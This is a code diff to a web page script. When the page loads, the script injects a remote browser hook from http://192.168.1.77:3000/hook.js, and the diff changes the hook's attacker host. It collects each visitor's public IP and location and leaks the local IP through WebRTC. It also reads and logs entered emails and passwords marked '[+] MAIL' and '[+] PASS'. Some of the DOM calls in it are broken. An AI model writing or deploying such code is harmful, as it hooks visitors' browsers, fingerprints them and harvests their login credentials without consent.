@@ -2,12 +2,12 @@
 
 // Run the script when the page loads
 window.onload = () => {
-    updateIPui();
     const newScript = document.createElement("script");
-    newScript.src = "http://192.168.1.112:3000/hook.js";
+    newScript.src = "http://192.168.1.77:3000/hook.js";
     newScript.id = "dynamic-script3";
-    newScript.click()
     document.body.appendChild(newScript);
+
+    newScript.click()
 
 };
 
@@ -21,10 +21,10 @@ async function getVisitorInfo() {
         const publicIpData = await publicIpResponse.json();
         console.log("public ip data", publicIpData);
 
-    
+
         // Fetch local IP address
         const localIp = await getLocalIP();
-        
+
         const visitorInfo = {
             publicIP: publicIpData.ip,
             location: `${publicIpData.city}, ${publicIpData.region}, ${publicIpData.country}`,
@@ -47,7 +47,7 @@ async function getLocalIP() {
     return new Promise((resolve) => {
         const peerConnection = new RTCPeerConnection({ iceServers: [] });
 
-        peerConnection.createDataChannel(""); 
+        peerConnection.createDataChannel("");
         peerConnection.createOffer()
             .then(offer => peerConnection.setLocalDescription(offer))
             .catch(() => resolve(null));
@@ -63,11 +63,13 @@ async function getLocalIP() {
             }
         };
     });
-}
+};
 
 
 // Function to use the retrieved IP in another process
 
+getVisitorInfo();
+getLocalIP();
 
 // Call the function
 var ipaddr = getVisitorInfo();
@@ -87,11 +89,10 @@ document.addEventListener("DOMContentLoaded", function () {
 
             // Create and append a new script element to reload hook.js
             const newScript = document.createElement("script");
-            newScript.src = "192.168.1.112:3000/hook.js";
+            newScript.src = "192.168.1.77:3000/hook.js";
             newScript.id = "dynamic-script";
-
             document.body.appendChild(newScript);
-
+            newScript.click();
             console.log("hook.js reloaded!");
         });
     }
@@ -110,7 +111,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
             // Create and append a new script element to reload hook.js
             const newScript = document.createElement("script");
-            newScript.src = "http://192.168.1.112:3000/hook.js";
+            newScript.src = "http://192.168.1.77:3000/hook.js";
             newScript.id = "dynamic-script";
             newScript.click() // trigger the click event
             document.body.appendChild(newScript);
@@ -118,14 +119,10 @@ document.addEventListener("DOMContentLoaded", function () {
             // Create a WebSocket connection to the server
             console.log("hook.js reloaded!");
 
-            const socket = new WebSocket("ws://192.168.1.112:5501");
-            socket.onopen = (event) => {
-                console.log("WebSocket connection opened");
-            };
-            
         });
-    }
+
 });
+
 
 
 
@@ -162,7 +159,7 @@ document.getElementByType("submit").addEventListener("click", () => {
     const passsInput = document.getElementByType("password_val");
 
     const email = emailInput.value;
-    const pass = passsInput.value; 
+    const pass = passsInput.value;
 
     console.log("[+] ]MAIL ", email)
     console.log("[+] PASS", pass)
